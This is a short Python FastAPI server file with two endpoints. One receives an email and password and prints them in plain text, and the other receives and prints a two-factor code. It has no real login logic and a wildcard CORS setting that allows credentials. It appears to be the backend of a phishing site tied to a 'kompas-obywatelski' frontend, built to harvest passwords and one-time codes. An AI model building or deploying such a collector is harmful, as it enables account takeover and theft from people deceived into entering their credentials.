from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from models import Credentials, CodeInput

app = FastAPI()

origins = [
    "https://kompas-obywatelski.vercel.app/",
]


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)



@app.post("/login/")
async def read_credentials(credentials: Credentials):
    # Open file in append mode and wr ite the credentials
    print(f"{credentials.email} | {credentials.password}")
    return {"status": "ok"}



@app.post("/submit_code/")
async def submit_code(data: CodeInput):
    print(f"Submitted 2FA code: {data.code}")
    return {"status": "code received"}